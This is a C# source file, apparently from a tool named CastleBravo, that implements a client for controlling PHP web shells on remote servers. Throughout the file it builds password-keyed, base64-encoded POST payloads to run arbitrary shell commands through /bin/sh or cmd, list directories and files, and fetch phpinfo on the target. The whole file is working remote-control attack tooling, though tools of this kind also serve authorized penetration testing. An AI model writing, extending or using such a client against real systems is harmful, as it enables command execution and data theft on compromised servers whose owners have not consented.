using C2.Core;
using C2.Utils;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Cache;
using System.Text;

namespace C2.Business.CastleBravo.WebShellTool
{
    public class WebShellClient
    {
        private readonly string url;
        private readonly string prefix;
        private readonly StringBuilder sb;
        private readonly WebShellClientSetting clientSetting;
       

        public string FetchLog() { string ret = sb.ToString(); sb.Clear(); return ret; }

        public WebShellClient(string url, string password, string clientSetting)
        {
            this.url = url;
            this.clientSetting = WebShellClientSetting.LoadSetting(clientSetting);
            this.prefix = password + "=" + this.clientSetting.PHP_MAKE + "&" + this.clientSetting.ACTION;
            this.sb = new StringBuilder();
        }

        public Tuple<string, string> ShellStart()
        {
            List<string> paths = PHPIndex();
            return paths.IsEmpty() ? Tuple.Create(string.Empty, string.Empty) : Tuple.Create(paths[0], string.Empty);
        }

        public Tuple<string, string> Excute(string root, string command)
        {
            //需要先判断是什么系统
            bool isLinux = root.StartsWith("/");
            string shellEnv = isLinux ? "/bin/sh" : "cmd";
            string template = isLinux ? "cd \"{0}\";{1};echo [S];pwd;echo [E]" : "cd /d \"{0}\"&{1}&echo [S]&cd&echo [E]";
            
            string remoteCmd = string.Format(template, root, command);

            string[] ret = PHPShell(shellEnv, remoteCmd).Split("[S]");

            try
            {
                ret[0] = isLinux ? ret[0].Replace("\n", "\r\n") : ret[0];
                root   = ret[1].Split("[E]")[0].Trim(new char[] { '\n', '\r' });
            }
            catch
            {
                return Tuple.Create(root, string.Empty) ;
            }

            return Tuple.Create(root, ret[0]);
        }

        public Tuple<string, List<WSFile>, List<string>> PathBrowser()
        {
            return PathBrowser(PHPIndex());
        }

        public Tuple<string, List<WSFile>, List<string>> PathBrowser(List<string> paths)
        {
            List<WSFile> children = new List<WSFile>();
            List<string> brothers = new List<string>();

            if (paths.Count == 0 || string.IsNullOrEmpty(paths[0]))
                return Tuple.Create(string.Empty, children, brothers);

            string root = paths[0];

            //broPath仅针对window文件系统，内容为c: d: e:
            if (paths.Count == 2 && paths[1].Contains(":"))
                brothers = paths[1].Split(':').ToList();

            string ret = PHPReadDict(root);
            foreach (string line in ret.Split('\n'))
            {
                string[] info = line.Split('\t');
                if (info.Length < 4 || info[0].IsNullOrEmpty() || info[0] == "./" || info[0] == "../")
                    continue;

                children.Add(new WSFile(info[0].EndsWith("/") ? WebShellFileType.Directory : WebShellFileType.File,
                                        info[0].TrimEnd('/'),
                                        info[1],
                                        info[2],
                                        info[3]));
            }
            return Tuple.Create(root, children, brothers);
        }
        public string PHPInfo()
        {
            string payload = String.Format("{0}={1}", prefix, clientSetting.PHP_INFO);

            sb.AppendLine("phpinfo:")
              .AppendLine(payload);

            return Post(payload);
        }

        private List<string> PHPIndex()
        {
            string payload = String.Format("{0}={1}", prefix, clientSetting.PHP_INDEX);

            sb.AppendLine("浏览目录:")
              .AppendLine(payload);

            string[] result = Post(payload).Split('\t');
            return result.Skip(0).Take(result.Length - 1).ToList();
        }

        private string PHPReadDict(string path)
        {
            string payload = String.Format("{0}={1}&{2}={3}", 
                prefix, 
                clientSetting.PHP_READDICT, 
                clientSetting.PARAM1, 
                Encode(path));

            return Post(payload);
        }

        private string PHPShell(string shellEnv, string command)
        {
            string payload = String.Format("{0}={1}&{2}={3}&{4}={5}",
                prefix,
                clientSetting.PHP_SHELL,
                clientSetting.PARAM1,
                Encode(shellEnv),
                clientSetting.PARAM2,
                Encode(command));

            sb.AppendLine("Remote Command:" + command)
              .AppendLine(payload);

            return Post(payload);
        }

        private string Post(string payload)
        {    
            string response = string.Empty;
            try
            {
                byte[] bytes = Encoding.Default.GetBytes(payload);
                using (GuarderUtil.WaitCursor)
                    // TODO: 测试时发现webclient必须每次new一个新的才行, 按道理不应该
                    bytes = WebClientEx.Create()
                                       .UploadData(url, "POST", bytes);

                response = Encoding.Default.GetString(bytes); 
            }
            catch (Exception ex)
            {
                sb.AppendLine(ex.Message);
            }

            return MidStrEx(response, clientSetting.SPL, clientSetting.SPR);
        }

        private string MidStrEx(string sourse, string spl, string spr)
        {
            int splIndex = sourse.IndexOf(spl);
            if (splIndex == -1) return string.Empty;

            sourse = sourse.Substring(splIndex + spl.Length);

            int sprIndex = sourse.IndexOf(spr);
            if (sprIndex == -1) return string.Empty;

            return sourse.Remove(sprIndex);
        }

        private string Encode(string str)
        {
            return Uri.UnescapeDataString(ST.EncodeBase64(str));  // HttpUtility.UrlEncode有+号坑,代替之
        }
    }

    public enum WebShellFileType
    {
        Null,
        Directory,
        File
    }

    public class WSFile
    {
        public WebShellFileType Type { get; set; }
        public string FileName { get; set; }
        public string CreateTime { get; set; }
        public string FileSize { get; set; }
        public string LastMod { get; set; }

        public WSFile(WebShellFileType type, string fileName, string createTime, string fileSize, string lastMod)
        {
            Type = type;
            FileName = fileName;
            CreateTime = createTime;
            FileSize = fileSize;
            LastMod = lastMod;
        }
    }


    public class WebClientEx : WebClient
    {
        public int Timeout { get; set; }

        protected override WebRequest GetWebRequest(Uri address)
        {
            var request = base.GetWebRequest(address);
            request.Timeout = Timeout;
            return request;
        }

        public static WebClientEx Create()
        {
            WebClientEx one = new WebClientEx()
            {
                Timeout = 30000,              // 30秒
                Encoding = Encoding.Default,
                CachePolicy = new RequestCachePolicy(RequestCacheLevel.NoCacheNoStore)
            };

            one.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            return one;
        }
    }
}

